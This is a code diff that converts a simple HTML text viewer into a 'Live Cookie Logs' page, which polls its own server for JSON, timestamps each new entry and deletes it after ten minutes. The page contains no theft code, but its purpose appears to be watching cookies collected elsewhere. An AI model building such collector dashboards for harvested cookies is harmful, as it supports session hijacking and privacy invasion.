@@ -1,7 +1,8 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Live Text Viewer</title>
+    <title>Live Log Viewer</title>
+
     <style>
         body {
             background: #111;
@@ -13,31 +14,77 @@
         #box {
             border: 1px solid #0f0;
             padding: 15px;
-            min-height: 200px;
+            height: 70vh;
+            overflow-y: auto;
             white-space: pre-wrap;
+        }
+
+        .entry {
+            border-bottom: 1px solid #0f0;
+            padding: 10px 0;
+        }
+
+        .time {
+            color: #888;
+            font-size: 12px;
         }
     </style>
 </head>
+
 <body>
 
-<h2>Received Data:</h2>
-
-<!-- ✅ THIS WAS MISSING -->
-<div id="box">Waiting...</div>
+<h2>Live Cookie Logs</h2>
+<div id="box"></div>
 
 <script>
+const seen = new Set();
+
+// store last snapshot to detect changes
+let lastData = "";
+
+function addLog(data) {
+    const box = document.getElementById("box");
+
+    const entry = document.createElement("div");
+    entry.className = "entry";
+
+    const time = new Date().toLocaleTimeString();
+
+    entry.innerHTML = `
+        <div class="time">[${time}]</div>
+        <pre>${JSON.stringify(data, null, 2)}</pre>
+    `;
+
+    box.appendChild(entry);
+
+    // auto scroll
+    box.scrollTop = box.scrollHeight;
+
+    // delete after 10 min
+    setTimeout(() => {
+        entry.remove();
+    }, 10 * 60 * 1000);
+}
+
 async function fetchData() {
     try {
         const res = await fetch('/data');
-        const text = await res.text();
-        document.getElementById('box').textContent = text;
+        const data = await res.json();
+
+        const serialized = JSON.stringify(data);
+
+        // only add if new data
+        if (serialized !== lastData) {
+            lastData = serialized;
+            addLog(data);
+        }
+
     } catch (e) {
-        document.getElementById('box').textContent = "Error";
+        console.error(e);
     }
 }
 
-// Refresh every second
-setInterval(fetchData, 1000);
+setInterval(fetchData, 2000);
 fetchData();
 </script>
 
